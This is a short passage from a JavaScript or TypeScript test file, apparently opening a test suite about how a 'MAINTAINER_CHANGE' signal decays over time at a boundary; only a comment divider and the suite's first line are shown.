 // ═══════════════════════════════════════════════════════════════════════
 
 describe('MAINTAINER_CHANGE time decay boundary', () => {
